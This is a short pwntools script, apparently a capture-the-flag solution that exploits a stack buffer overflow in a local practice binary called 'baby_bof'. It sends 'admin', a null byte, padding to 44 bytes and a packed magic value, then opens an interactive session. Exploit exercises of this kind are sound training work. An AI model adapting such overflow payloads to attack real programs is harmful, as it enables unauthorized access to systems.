from pwn import *

p = process("./baby_bof")
#pid = gdb.attach(p, gdbscript="b* vuln")
p.recvline()

mal = b'admin\0'
mal += b'A' * (44 - len(mal))
mal += p64(0x1337c0de)
p.send(mal)

p.interactive()
